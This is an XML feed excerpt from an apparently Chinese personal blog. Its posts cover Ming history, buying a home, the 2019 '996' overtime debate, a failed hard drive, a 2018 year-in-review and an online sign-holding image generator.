天下糜烂，百姓从贼，皆因饥饿，百姓饥饿，皆因无地可耕，得人心者得天下，你们知道什么是人心吗？粮食，就是人心，就是源源不断的后备兵源，这就是为什么李自成可以输十回八回，而我孙传庭一回都输不起！]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么要了解历史？]]></title>
    <url>%2F2019%2F08%2F28%2F%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BA%86%E8%A7%A3%E5%8E%86%E5%8F%B2%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[今天本来想用韩磊的《谁主沉浮》做背景音乐的，可惜QQ木有版权，点击原文来听吧。 前几天（12.13）是国家公祭日5周年，这是为了纪念南京大屠杀的一个纪念日，看到人民日报发的微博 https://weibo.com/2803301701/H70XYES3I?from=page_1002062803301701_profile&amp;wvr=6&amp;mod=weibotime 稍微了解这段历史的人都会让人无限悲痛，当年南京经历过怎样的灾难，其实在抗日年代，中国不止南京如此，许许多多的城市被日本蹂躏，简直罄竹难书，记得小时候还听奶奶讲过鬼子进村的事，老百姓东躲西藏，能活下来真的不容易。 为什么要搞这样一个纪念日呢？有人说都过去那么多年了，都和平这么多年了，还搞仇恨做什么？殊不知：忘记历史就是背叛。《阿房宫赋》曰：秦人不暇自哀，而后人哀之；后人哀之而不鉴之，亦使后人而复哀后人也。 如果不记住教训，将来还会付出代价的，明末和清末就是典型。 所以我们为什么要学历史呢？知乎上有个答案很好的解答了：https://www.zhihu.com/question/20338058/answer/530065817 学历史为了了解人性，启发智慧。当你遇到难关的时候，过去有无数人和你遇到过这个问题，看看他们是如何应对的，从历史吸取教训，历史是无穷智慧的宝库，是无穷力量的来源，从历史中得到智慧，做自己生命的主人，开创理想的人生。 最近看了些关于明朝的节目和影视剧，主要有： 【百家讲坛】大明悲歌- -傅小凡解读崇祯那些年 https://www.bilibili.com/video/av27428932/?p=9 电视剧《逐鹿中原》http://www.iqiyi.com/w_19ruddm6ul.html 华夏名将传第三季 李定国 https://www.bilibili.com/video/av14738317 商传《是谁误读了晚明史》https://www.bilibili.com/video/av3235903/?p=2 【纪录片】历史转折点 https://www.bilibili.com/video/av12377871/?spm_id_from=333.788.videocard.12 南明永历时期人物群像【谁主沉浮】 https://www.bilibili.com/video/av7776714?from=search&amp;seid=13589540431620148406 全面战争纪录片：两蹶名王 李定国 https://www.bilibili.com/video/av23327640?from=search&amp;seid=4808348108626393247 电影 大英雄郑成功 http://www.1905.com/vod/play/393564.shtml 大英雄郑成功 https://www.bilibili.com/video/av11306438 郑成功 起兵反清复明 https://www.bilibili.com/video/av21335358?from=search&amp;seid=5349717137594449209 历史那些事 https://www.bilibili.com/bangumi/media/md139572/ 另外十分推荐小说《明朝那些事》，记得大学的时候天天在天涯上等更新来看，可以说明朝历史渐渐为人熟知，当年明月功不可没。 之前写过公元 1644 看完《大明悲歌》时发了条微博，过去的封建王朝300年是大限，明朝也避免不了，但明朝亡在崇祯手里真的不应该，刚登基天下并没有大乱，野猪皮还在关外，彼时杀阉党，整朝纲，那是多么的意气风发，殚精竭虑要中兴大明，乃明代初朱元璋最勤奋的君王了。但大明的担子实在太重了，他一个人真的扛不过来了，因为和大臣已经不是一条心了，而且错杀忠臣，其中有部分原因也是他自己造成的，性格的致命弱点：多疑，不担负责任，优柔寡断，使得再没有大臣跟他混了，在最后关头，还依然阻止南迁，难道他们不知道 皮之不存毛将焉附的道理，那些人精肯定是知道的，但是他们不想为崇祯卖力了，他们都准备好迎接李自成了，如果不是太监曹化淳不抵抗，还有无数内奸，说不定能等到吴三桂的援军，也不至于吊死煤山，可叹啊，历史给了崇祯好几道选择题，但他居然全部选错了，大明就这样亡于崇祯，实在是不应该。 由于没有南迁，也没有让太子南迁，导致之后的晚明为了争夺王位，还在内斗，只支撑了18年，没有成为另外一个南宋，大明并不缺名将，卢象升，孙传庭，李定国，郑成功，都是英雄人物，明明可以翻盘的，可惜在不断内斗中被消耗，最终让野猪皮捡漏取得天下，真让人悲痛不已，太让人惋惜了。 还有最让人痛恨的是明末4大汉奸：范文程，吴三桂，洪承畴，尚可喜，曾经的明朝官军成了反明的主力，曾经的反贼（李定国大西军）成了保卫明朝的主力，真是令人讽刺。如果没有这4大汉奸如此卖力，毕竟满清人口不足百万，军队才20多万，如何能征服汉族几千万百姓！南明或许可以与满清划江而治。你说投降就投降吧，还这么卖力，真令人费解。最终让满清奴役中华300年，直到孙中山那句：驱逐鞑虏，恢复中华。才结束了满清的统治。 然而还有个更让人愤懑的是唯一一部描述南明抗清历史的电视剧《逐鹿中原》居然将李定国改名李长生，王夫之改名万扶植，难道为了所谓的ming zu 团结就可以忘记那段黑暗的历史吗！！！况且剧里江阴81日，嘉定三屠这样的大屠杀都没有提，也许有一个解释就是上面还有满遗，为了掩盖野猪皮暴行而粉饰，顺便大拍辫子戏，看看今年的《延禧攻略》《如懿传》就知道了，整个一口一口奴才，令人恶心的很。看看那部奥斯卡影片《末代皇帝》https://www.bilibili.com/video/av37981720 溥仪的所作所为可知，相比崇祯的天子守国门，君王死社稷，简直天壤之别。 生死都从李晋王 我的大明！！！ 再推荐下昨天人民日报这条微博 #改革开放40周年#【震撼150秒！40年，中国人就是这样干出来的！】150秒，浓缩40年↓↓这是动态演进，也是历史趋势。 https://weibo.com/2803301701/H7itt4MqR?from=page_1002062803301701_profile&amp;wvr=6&amp;mod=weibotime 国家40年的发展才有今天的安定生活！看得让人热血沸腾。 今天12月16 了，2018马上结束了，年复一年，来看看2018年五十大#喜感新闻#吧，来自微博 https://weibo.com/1680241201/H6RnGywBv?type=comment#_rnd1544966978291 2018沙雕新闻盘点https://weibo.com/1640601392/H69pWyyen?type=comment#_rnd1544967275290]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 回家过年]]></title>
    <url>%2F2019%2F08%2F27%2F2019-%E5%9B%9E%E5%AE%B6%E8%BF%87%E5%B9%B4%2F</url>
    <content type="text"><![CDATA[微博上看到一张图，太真实了，哈哈。 今天已经是27号了，没几天就要过年了。 最近很多公司开年会，有人总结了年会报告 年会不完全观察报告 。 昨天公司举办了2019 新浪新年party，下午5点到的，是酒席式的，边吃边看节目，抽奖，但是却一个没抽到，哭。。。 居然是个蛋糕 专门建了个红包群，然而我只抢了400左右，好几个一万的红包没抢到。。。 party的更多高清图片点击原文看吧。 这几天微博又出了个社交关系数据，看看我的2018时光之门吧 https://m.weibo.cn/z/annual/report?topnavstyle=1&amp;immersiveScroll=0&amp;sudaref=login.sina.com.cn 最近在b站看到一个非常有意思的账号，三乐大掌柜 https://space.bilibili.com/21836154 ，而且人家名字是根据古文来取的，来截取几张图片，原来小学的题目这么有意思，回去可以给小朋友讲讲。 最近在老家买房子了，没想到小县城的房子都5000多了，首付出25万，贷款30万，10年还完，一个月3000，压力倒不大，今年多赚钱理财吧。开贷款证明需要征信记录和工资流水，所以周五到人民银行查征信记录，8点就到了，要9点才上班，没想到不用排队，有自助机器，放身份证人脸识别就可以直接打印出来，真的方便啊，科技改变生活。 新浪开工资证明也很简单，在内网申请下去人事直接取。 今天又看到一个暖心视频，分享下，是贾樟柯应苹果邀请，用iPhone XS 拍摄的春节话题短片《一个桶》上线。 分享一个微信使用小技巧和一些总结： 先打开收藏，然后点击右上角的加号 然后点击最右侧的图标，选择待办 然后就可以添加待办事项，添加完成之后再点右上角的三个点，选择在聊天中置顶 返回你的主界面 就可以看到你的待办事项十分清晰的列在上面啦～ 有重要的事情这样就不会忘了，超级方便！ 合理的规划可以有效提高生活效率 我的2018年个人总结 40岁的周杰伦，停留在多少20岁的记忆里 2018年中国微信500强年报 2018年Python爱好者社区历史文章合集 10W+爆文靠搬运！本地自媒体还能这么玩 2018版公众号文章合辑 2018最具收藏价值公众号Top50 公众号的2018 学Python前请你先看看这个文章 近三个月以来的v+长文微博做个汇总 https://weibo.com/5198011111/Hd6HfrNrN 豆瓣 TOP 500 书单整理，按照豆瓣评分排序。最近书荒的， https://weibo.com/5888006271/H0jgB9rCd 已买好票，下周六就要回家过年了，先祝大家新年好，一帆风顺年年好， 万事如意步步高。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[天下苦 996 久矣]]></title>
    <url>%2F2019%2F08%2F27%2F%E5%A4%A9%E4%B8%8B%E8%8B%A6-996-%E4%B9%85%E7%9F%A3%2F</url>
    <content type="text"><![CDATA[上周清明节放假请假2天回了老家，因为年前买的房子要签贷款按揭手续，但银行可能周4提前下班，而且可能人多办不完，只好请假了2天，心疼我的工资啊。2号下班就赶火车站，5点50出门，叫滴滴打车，6点上车，6点20到西二旗，直接坐地铁去北京西站。7点50的火车，7点到北京西站，正好一个小时，还是地铁靠谱，还好没打车。 由于正好赶上周末，于是在家休息了4天，真舒服。 这个月10号就开始还贷款了。每个月3500，还10年，以后要注意支出了。 话说老家的房子都5000多了。 最近最热门的怀话题莫过于996了，知乎一直是热榜。 事情缘由是前段时间在github代码托管平台上，有人发起“996.ICU”项目以抵制公司的“996”工作制。“996”指员工从上午9点工作到晚上9点，每周工作6天；“ICU”则指员工因长时间工作，易患各种重大疾病，最后直接送进ICU病房。 关于这个项目的影响力相信你在各个平台都已经看到了。 目前已进入github star第2名 216k，不得不服。 但比较让人费解的是国产浏览器居然屏蔽了这个项目 https://github.com/996icu/996.ICU 但是https://github.com/996icu/996.ICU/ 这样访问正常，哎，真的可以！！！ 话题进入高潮点就是最近马云关于996的言论 ，见文章 马云谈996 大家的讨论也是众说纷纭，以下摘录一些代表性的评论： 小王是一名 996 员工。小王一天工作 12 个小时，其中1 个小时在开会，1 个小时因为还没睡醒在盯着电脑发呆，2 个小时在吃饭并喝了咖啡，1 个小时在思考昨天写到哪里了，2 个小时在给昨天乱写的代码擦屁股，2 个小时在好好工作，1 个小时在和其他人推锅扯皮，2 个小时因为不在状态决定想到哪里写到哪里。小王一天有 12 小时不在工作，其中2 小时在上下班，2 小时在处理家务和杂事，如果想安排娱乐或者学习，那么小王今天就睡不满 8 小时。小王觉得贫穷就要奋斗，只有比别人更努力加班，才能实现阶层跨越。35 岁后， 小王猝死了。 小王因为技术落伍被公司开除了。 引用来自上世纪20年代的美国短篇小说： “约翰是个棒小伙，是那种所有工头都愿意抓在手里的工人，每当遇到困难他总是挺起胸脯说“我再努努力坚持一下”，他娶了一个可爱的姑娘，从银行贷款买下一栋房子，每个月要偿还不菲的数目。约翰以为自己会永远年轻，可他不知道终有一天他的背会驼，胸再也挺不起来，没人找他干活。在约翰还不上贷款后，银行按照合同收回了房子，并把它翻修贴上“待售”的标签，它张着满口獠牙的嘴巴，等待吞噬下一个像约翰这样对生活充满憧憬的年轻人……” 企业家没必要和员工讲“兄弟情”，两者完全是不对等的，肩负的责任、风险、投入和回报根本不在一个层面上，即便是你放下身段诚心叫人“兄弟”，你兄弟也不敢当真。 真心以兄弟相待的团伙，那是黑社会，彼此能把性命交给对方，才是兄弟。有些人叫你兄弟，只是想让你把性命交给他。 我们绝大部分人工作，不是为了实现什么。 不是为了老板你构建的宏伟目标， 不是为了迎合老板你的价值观， 而是为了自己的房贷， 而是为了孩子的尿布，学费， 而是为了老人的药钱， 以及未来被裁掉的时候，自己有维持生活的最低保障。 我们听了你的话， 拼搏了，加班了，996了。 我们得到了什么？ 抑郁症，从上到下的疾病， 年轻的时候被称为兄弟，中年时候被“调整或协商解决掉”。 你们得到了什么？ 直线增长的个人财富， 纽约敲钟， 国外大学泡女学生。 美国监狱囚服。 不要说我们没有狼性， 不要说我们不符合公司的价值观 你们没体验过房贷压身上喘不过气的滋味 你们没体验过老人需要看病孩子需要上学的压力 你们和我生活在两个世界 你们的世界里有融资IPO 我们的世界里是柴米油盐酱醋茶 你们的词典里有拼搏狼性创新 我们的词典里是尿布学费房贷 然后你还问，为什么你不享受和我一起追梦的过程？ 我们能做的， 就是在劳动法规定的工作时间内，把属于我的工作做好。 仅此而已 你们画的大饼，我永远都吃不到 面试时观察一下， 办公室鸦雀无声，办公桌整齐干净，会议室多数空着，员工面无表情的，那是965。 办公室热热闹闹，办公桌杂乱无章，会议室少数空着，员工嘻嘻哈哈的，那是996。 办公室人声鼎沸，办公桌堆满零食，会议室全部满着，员工勾肩搭背的，那是007。 一般来说，喜欢把兄弟两个字整天挂在嘴上，然后让别人为自己卖命的，要么是骗子，要么是大骗子。 通篇惊叹号，显得非常没有文化。我怀疑前两天调教男朋友买爱马仕的私信就是他代笔的。 文章结尾把为京东加班，上升到让祖国更强大，帮助更多贫困人口的高度，真是有一种小学生作文的虚伪调性。 你在美国明尼苏达州喝红酒的时候，还记得那些贫困人口吗。 前两年企业流行画大饼说梦想，现在流行励志洗脑心灵鼓励。 刘强东也好，马云也好，都在为996戴上一个崇高的帽子。年轻的你不拼搏还等什么？你们应该有拼搏精神！只有拼搏的人生才有价值！ 其实，任何员工唯一需要做到的就是两个字：尽责。 企业家对员工的最高要求也只能到尽责，而不是拼命。你凭什么让别人拼命？你能对别人的人生负责吗？ 我特别讨厌那种企业家，像饭桌上喝多了的中老年男性，狂讲自己打拼时有多辛苦，十年创业路，一把辛酸泪，并以此来要求员工。 这不是废话吗，你自己的事业，你自己不全身心努力，弱智？ 不要相信那些鼓动人心的话。他们是希望你为拥有私人时间的惬意而羞愧，是在贩卖你不加班就是在后退的焦虑。 所有的内容说到底，就是一句话：你这只驴啊，生命的价值就是要多给我拉磨！ 其实即使你在有空调的办公室，用着最新的电子产品，经手着大额的业务，本质和车间里的工人也没什么区别。 只是当年的美国工人走上街头，现在的我们相信996能带来美好的未来。 越是吹嘘长期996的崇高，越是在贬低和绞杀正常的8小时工作制。毕竟8小时工作制是受法律保护的。 当然这个讨论的前提是，如果我们真的在一个处处公平合法的环境里就好了。 4月11日，他在内部交流里表达了对996的看法： 1、能做996是一种巨大的福气，很多公司、很多人想996都没有机会。不付出超人的努力和时间，凭什么成功？ 2、BAT这些公司能够996，是我们这些人修来的福报。想一下没有工作的人，公司明天可能关门的人，想想公司下季度收入都不知道的人 3、我很幸运，我没有后悔12 x 12（1天工作12小时，12个月无休），我从没有改变自己这一点。 4、加入阿里，你要做好准备一天12个小时，否则你来阿里干什么？我们不缺8小时上班很舒服的人。但是我们加什么班？加学我们8小时工作以后，最主要晚上是复盘、学习。 5、如果你8小时工作都不快乐，你做的这个事情就没有意义，你也不舒服。所以即使你不996，也不知道能干嘛。 6、这就是生活，你选择了一个中国今天排名第一的公司，第一是要付出代价。选择了，就把996做得舒服点，你工作一年可以抵人家工作20年，就这么回事。 的确，同样是做事，有人看作是谋生的“工作”，有人视为“事业，还有人奉为“内心召唤”，定位背后，是每个人的心态，与饥渴感。 互联网的世界，要比传统行业的时间密度更大。因为不断有年轻人投入其中，燃烧自己的青春，但这些公司沉淀下丰富的养料，让它们飞速成长。 只是，你的选择是什么呢？又将如何平衡其中的忙碌与生活呢？ 马云老师一席话，说996是为了个人成长。 好，我们就来说说个人成长。 1988年，马云在杭州电子工业学院当老师，1995年辞职创业。 当老师的七年间，马老师发起了西湖边的英语角，开始建立自己的名气；成立了海博翻译社，为了生存，翻译社卖过鲜花和医药用品，马老师亲自背着麻袋到义乌进货；因为翻译社的工作结识了一名西雅图的外教，有机会参观了国外的公司，了解到互联网未来的可能性，于是开始寻找机会创业。 再次强调：付出这些努力的时候，他的身份，是一名在职老师。 两个问题： 1、马老师的个人成长，是因为那份英语老师的教学工作，还是因为本职工作以外的个人事务？ 2、如果马老师在杭州电子工业学院的工作是996，每天回家只想摊在床上，那么他有没有时间和精力来独立思考，又有没有时间和精力完成以上所有让他成长的事情？ 马老师说，“我不要说996，到今天为止，我肯定是12×12以上。” 他说的不错，他从没有放弃过努力。 但是，请注意，他并没有把努力的方向放在本职工作上。 他用自己作为努力的样本，但他炫耀的12×12，只投入在属于自己个人的事业里。 他只为自己努力。 努力很重要，但找错了方向的努力，只是白白给老板做嫁衣。 当年马老师很聪明，他没有给电子工业学校的校长做嫁衣。他努力做的每一件衣服，都只收到自己的衣柜里。 今天他还是很聪明，用996占满所有员工的时间。因为他深知如果员工都腾出时间提升自己，那么作为老板的他，就挣不到钱了。 成长是什么？ 成长是摆脱已知的重复，吸收新的知识，新的阅历，扩展新的视野。只有新的信息里，才藏着和现状不同的可能性。 而996是什么？是用已知的重复占满所有的时间，让人没有精力吸收新的信息，启发新的思考，从而断绝所有新的可能。 成长是一种改变，改变只能发生在重复的循环之外。 说工作可以让人成长，首先这份工作必须具有创造性。可如今，有多少人是做着创造性的工作？ 大多数人每天的工作，只不过是机械的重复劳动。拧一千遍螺丝，难道能学会管理工厂？ 如果这位拧螺丝的工人想要快乐，下班回家可以看看电视打打游戏，收获快乐的心情。 如果他想要奋斗，想要成功，就得在八小时外多读些专业的书籍，参加相关的课程，收获能力的提升；或者像马老师一样结交一些创业的人脉，做一些创业的尝试。 如果他想要既不快乐又没有前途的人生，那就听老板的996，毁掉自己的生活的同时，相信每天重复的劳动，可以莫名其妙地让自己脱胎换骨。 马老师自己是第二种人，但如今，他教育大家要做第三种人，为身为老板的他牺牲自己的人生。 倒是不遮不掩，冠冕堂皇。 “如果8小时工作都不快乐，你做的这个事情就没有意义。你干嘛呢，八小时不知道干嘛，即使你不996，你也不知道干嘛。” 我真的是要气笑了。马老板高坐云端，怕是不知道对普通人来说，必须工作这件事是没得选择的。 烦躁也好，厌恶也罢，工作都是我们必须承受的煎熬，没那么多意义理由之类的东西，更不敢奢望快乐。 而人生大多数的意义，在八小时之外的生活里。 上班的时候，我们只是螺丝钉，是流水线上的工具。 下班的时候，我们才是自己，是一个活生生的人。 无论是用来喘息，用来提升自己，还是用来陪伴家人，在那个时候，我们才是自己。 而今天，有个老板说，这一切都没有价值。 呵呵，对他来说，当然没有价值。 古龙写过一个画面，一对厨子在饭店打烊后的深夜，在后厨喝点小酒，舒服一两个时辰。 “他们还活着，就是因为一天还有那么一两个时辰。” “即使你不996，你也不知道干嘛。” 在为生存奔忙的间隙里，我们还能做什么？ 我们想活着。 活得像一个人。 老板：小伙子，看到公司门口我的兰博基尼了吗？只要你努力工作，爱岗敬业，天天加班，我还可以买一辆。 看看马老师过去的言论，打脸了。 引用了这么多，一句话，我反对996，我工作过的公司其中有一家实行过996，不过还好是一段时间。上一家公司微吼偶尔会周末加班，甚至到凌晨，但也没实行过996，现在的公司新浪更是没有，有一次中秋节加班一天，还给倍工资，简直业界良心，周末有自己的时间干点有意思的多好，否则公众号都没时间更新。我希望的996是这样的。 996相关链接： 996Chrome扩展已上线，旨在各大招聘网站标记996.ICU和955.WLB上榜公司 https://zhuanlan.zhihu.com/p/62056732 996.ICU背后：程序员在互联网公司的真实生态 工作996生病ICU，劳动监察部门应积极介入https://weibo.com/2803301701/HocY5yIWU 抵制 996，从自身做起https://github.com/lizhichao/VicWord 996.icu 这个项目很火我统计了下 star 增长速度https://github.com/timqian/star-history 996icu 事件的背后https://www.boatsky.com/blog/69.html 996icu 的 github排名第2 https://github.com/search?utf8=✓&amp;q=stars%3A&gt;80000&amp;type=Repositories 如何看待马云 4 月 11 日在内外直播中将 996 称为「修来的福报」？https://www.zhihu.com/question/319774219/answer/648966579 我反对996 如何鉴别996公司？https://www.zhihu.com/question/319416565/answer/647683893 “工作996，生病ICU” 你遭遇过这样的加班吗https://weibo.com/2656274875/HoPDyoFVd?type=comment#_rnd1555247226439 职场黑话大全（互联网公司百科版） 加班？996？其实原本就是事实，只不过说出来有点残酷而已 除了996 ICU，GitHub上还有哪些奇葩的项目？ 公司作恶行为名单https://github.com/996icu/996.ICU/pull/24904 如何看待 996.ICU 被多家浏览器列为黑名单https://www.zhihu.com/question/318520730 程序员996和施工的比，哪个累？https://www.zhihu.com/question/318152746 一大波IT公司员工下班时间大曝光，这年头，不加班都不好意思说自己是上班族的https://weibo.com/1715118170/HoVYcdExf 「996是你修来的福报」太荒谬了 身体是你自己的，健康是你自己的。 专业医生编写的就医指南 - 如何看病 by Golden Grapehttps://goldengrape.github.io/posts/ophthalmology/How-to-see-a-doctor/ 后续 App - 关注热点新闻后续 https://houxuapp.com/ houxu.app Python 之父 Guido van Rossum 再次发声 Can we do something for 996 programmers in China?https://www.v2ex.com/t/552741 955WLB 微信小程序实时查看 955 公司名单https://github.com/formulahendry/955.WLB 共青团中央谈 996 的文章 996黑名单公司 https://github.com/996icu/996.ICU/blob/master/blacklist/blacklist.md 白名单 https://github.com/996icu/996.ICU/tree/master/blacklist 这就是 996 的缩影？ 小伙骑车逆行被拦后爆发# 称压力好大 https://weibo.com/2334162530/HnuYwF3O2 给自己开源项目添加 996ICU License 和 Badge（徽章）来表示支持https://github.com/996icu/996.ICU/blob/master/LICENSE Anti996 Licensehttps://github.com/kattgu7/996-License-Draft 都是哪些程序员在 GitHub 上反对 996 https://www.thepaper.cn/newsDetail_forward_3219454 关于 996，换一个不同的方向聊，关于恶性效率 https://www.v2ex.com/t/550203 996 数据库https://996db.icu/ https://github.com/996db/996db.ICU 一场非常成功的“活动”-996ICU https://juejin.im/post/5c9cf8646fb9a070f2378abc 马云和刘强东的“996” 996经济 马云，一个虚伪的上帝 险恶的马云 最后推荐几个链接收藏好： 投诉运营商：www.chinatcc.gov.cn 投诉快递：sswz.spb.gov.cn 投诉电商：www.12315.cn 投诉骚扰电话和垃圾短信：www.12321.cn]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[再见了，我的硬盘]]></title>
    <url>%2F2019%2F08%2F27%2F%E5%86%8D%E8%A7%81%E4%BA%86%EF%BC%8C%E6%88%91%E7%9A%84%E7%A1%AC%E7%9B%98%2F</url>
    <content type="text"><![CDATA[这周太丧了，开始是周二我的v2账号被封，没有任何提示，一登录就404，搞得我莫名其妙，只好清掉cookie访问，然后给v2发邮件，很不幸，到现在没人回复，这个号对我很重要的，从2013年到现在，6年时间，陪伴了我这么久，收藏上万主题，回复那么多问题，积累那么多积分。。。现在都没有了，这几天都很难过。 没想到，更难过的是周三，电脑突然开机不了，一直提示下面这个，网上找了很多论坛，什么设置BIOS都改过也没用，一直提示 check cable connection ，拿到公司的it部门看，他们说是内存条坏了。 内存条坏了还不是要紧事，周六我去联想服务中心让人检测，发现是硬盘坏了，这就尴尬了，里面的数据都没了，从14年到现在的数据都没了，那一刻我是懵逼的，为什么会这样，为什么我一直没有备份数据，现在那些老照片，老电影，还有老师们的经典动作片都没了！！！ 之后在京东上买了款三星的ssd硬盘，花了499,重新装了个win8系统。http://t.cn/EysWuBF 人总是在失去后才懂得珍惜，文件丢失后才知道备份的重要性。 如何保护硬盘，看看这篇文章的建议 如何延长硬盘的寿命 – 一定记得要备份 最后时刻记得备份重要数据，比如到QQ群或者百度网盘等，万一哪天电脑出问题了不至于像我一样追悔莫及。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的 2018 年]]></title>
    <url>%2F2019%2F08%2F27%2F%E6%88%91%E7%9A%84-2018-%E5%B9%B4%2F</url>
    <content type="text"><![CDATA[]本文来自公众号转眼2018 就过去了，时间真的快啊，一年又一年。看到视觉志的文 1999 年过去了 ，我很怀念她。又开始写我的 2018 总结了，之前已经写过2年了。 我的 2017 年 我的2016年 先来看一个程序员版的年终总结，当然只是个娱乐：1234567891011121314151617181920212223242526272829303132333435这一年里，你一共写了 34 万行代码你热衷于使用组合键 ⌘ + C 和 ⌘ + V你热爱学习，喜欢和同事一起分享你们两个都不懂的技术知识你每天早上都会打开 Github 假装了解最新的技术知识2018 年，你说的最多的几句话是:* 这个需求做不了* 在我电脑上是好的啊* 你重启下电脑试试4.23 大概是很特别的一天 这一天里，你用了 548 次复制和粘贴的功能，提交了 549 行代码8.27 这一天你睡的很晚 凌晨 2:33 你才把自己的 Bug 列表清空然后在朋友圈里发表了一句: my code is No.1，我的代码就没有 Bug那一刻你好像感觉自己也成为了一个大佬2018 年的时间里* 你使用了 5 瓶霸王洗发露* 发际线上升了 4 cm* 各种颜色的格子衫挂满了你的衣柜2019 年May the Bug be with you. 有人还做了个网站生成器 http://summary.tomxin.cn/ ，甚至有命令行 cat “2017 年终总结.txt” | sed s/2018/2019/g | sed s/2017/2018/g | tee “2018 年终总结.txt” ，哈哈。 工作上今年比较大的变化就是6月的裸 辞，本来在微吼那家公司待的很久（4年），说实话不短了，但明显感觉没有挑战，最后做的项目微吼课堂几乎是我一个人在做，没什么团队的概念，技术也进步不了多少，于是辞职休息了段时间，7月来到新浪，不得不说这是个明智的决定。进入下半年整个经济开始下滑，最明显的感觉就是招聘电话少了，裁员消息多了，还好之前拒绝了几个小公司和同事邀请创业，大环境下还是大公司比较稳定，先稳定好现金流，而且在新浪工作生活都很nice，福利也多。 技术上还是以PHP为主，就是laravel,毕竟工作上用到，但目前项目上遇到瓶颈了，这个框架开发效率是高，但是性能扛不住，从入口到真正请求就要耗时150ms多，mysql，redis主服务器都在北方，南方就更慢了，于是团队准备根据syslog日志把一些访问量大的接口迁移到新框架，还有更高要求的迁移到go重写，当然这个需要时间，目前golang还在学习中。 工作之余还弄了2个公众号，这个号主要偏重生活，另外一个号偏重技术，已经发布近70篇文章了。 今年没在sf上用力，主要精力有限，只写了8篇文章，所以积分还是17K https://segmentfault.com/users ，《2018 PHP 面试 总结》这篇文章是目前赞数最高的文章，也是那次跳槽 面试的一个总结。 本公众号也推送少，平常就是周末更新下，这里推荐一个网 页 版 公众号列表，方便 p c上查看 http://www.ershicimi.com/ 另外还建了个 hexo 博客，放在 github上，就不用买 服 务 器，而且m d编辑很方便。https://sushengbuhuo.github.io/ 一转眼就跨越30 了，微博上看到一张图，很多人毕业后连excel都用不上 其实绝大多数人都是待在愚昧山峰之上或者走在通往愚昧山峰的路上，自以为上了几年学看过基本书就掌握了真理，不仅不知道自己“不知道”，甚至不认为自己“不知道”，越愚昧越抬杠、越无知越大声！只有幡然醒悟之后，才会持续学习，但这个过程是逆人性的，能坚持的人少之又少。逐渐拓宽知识体系和认知能力之后，这些又在对事物形成自己独立观点时被大脑充分调用和组合，就是不知道自己“知道”的状态，进入大师级别。 所以人还是要保持持续学习的状态，关于2019计划呢： 多读几本书，比如《万历15年》，《南明史》 深入 golang，工作上用好，另外开发一个可用的工具 开源节流，除了工作上加薪，做好理 财，增加现金流 把买的极客时间课程 刷完，用心总结 好好生活，作息规律（还是靠坚持），爱自己，爱另一半 最近各大APP都开始更新了2018的年终总结https://www.v2ex.com/t/523786 ，比如知乎，微博，网易，b站，喜马拉雅，支付宝，我平常用的APP不多，也就这些了。 下面看看我的知乎，今年玩知乎的时间明显多了，主要进新浪以后闲暇时间多了，比如中午饭后12:15吃完刷到1点午休，晚饭6:10饭后刷到7点半。看下知乎年度总结 https://2018.zhihu.com/pc.html 及知乎年度300问 https://zhuanlan.zhihu.com/p/52490894 b站: b站的2018总结，需要下载app查看，我懒得下，就不看了，网页链接是https://www.bilibili.com/blackboard/timemachine2018-pc.html 今年终于注册了个号，上面不少好的资 源和 节目，几乎每天晚上都会刷下，也收藏了不少好电影。 喜马拉雅： 其实听喜马拉雅好几年了，看看我的关注，主要是音乐类。 喜马的2018总结也要下载APP，我也懒得下了。 支付宝： 今年用支付宝频率增加不少了，主要支付宝经常搞活动抽红包，另外支付宝也好记账。 微博： 微博是每天刷，现在已经突破8万条微博了，我也是蛮拼的，2018 总结地址https://event.me.weibo.com/annual/summary 我的微博相册 里面有许多看过电影的截图 https://weibo.com/p/1005052717930601/photos?from=page_100505&amp;mod=TAB#place 电影最TOP 的2018年度十大国产佳片盘点， https://www.bilibili.com/video/av39733728 ，红海行动,暴裂无声,超时空时空，动物世界,我不是药神,江湖儿女,影，无双，找到你，狗十三 有几部还没看，抽 空也要看看。 网易云音乐： 没想到我的年度歌手是 @刘惜君 ，感谢她的声音 吴雨霏的《吴哥窑》居然听了280次。https://weibo.com/2717930601/HaFnRpsuQ?from=page_1005052717930601_profile&amp;wvr=6&amp;mod=weibotime 2018的网易云音乐年度总结地址 http://col.ink/c/year2018/JllmA/?uid=34AEBD5BD103A288114F41916A4B06CC&amp;full_screen=true&amp;keep_status_bar=true&amp;status_bar_type=dark&amp;userid=293753445&amp;from=timeline 年度歌单地址https://music.163.com/#/playlist?id=2610484253 去年的总结地址是https://st.music.163.com/c/year2017 经历过那些实现和未实现的 梦想，我们就这样长大了。 2019，许个愿吧。 https://weibo.com/1558820477/H9OGJ2iB1]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有意思的举牌告白小人]]></title>
    <url>%2F2019%2F08%2F27%2F%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E4%B8%BE%E7%89%8C%E5%91%8A%E7%99%BD%E5%B0%8F%E4%BA%BA%2F</url>
    <content type="text"><![CDATA[偶然看到这个图片，感觉挺有意思。 搜索了下发现有网站http://upuptoyou.com/ 提供生成这种图片服务，这种举牌小人来自一个台湾插画家设计。 举牌小人是由台湾插画家李翰旗下的翰你设计，与啧室股份有限公司旗下的集资平台“啧啧”，于2013年联名推出的网页应用程序，将用户想要表达的消息，以举牌文字数组的方式形成图片，由于支持多国语言，加上文字可随用户任意变化的缘故，因此引发网络爆红效应。 可惜这个网站在国外，有时候访问慢https://small-upup.upuptoyou.com/ 搜索了下很多网站都有这个功能，比如 http://www.nicetool.net/app/hold_up.html 输入文字就能在线生成了。 http://www.gaituba.com/jupaixiaoren/ 这个网站还能设置背景颜色什么的。 再搜索了下，有人开源了这个功能。https://github.com/jokin1999/HoldUpSign 有服务器可以自己搭建一个了。 它也提供了在线生成 http://1.hus.tcapps.twocola.com/ 输入 欢迎关注公众号苏生不惑，效果如下：当然还有小程序，比如这个 举牌小人 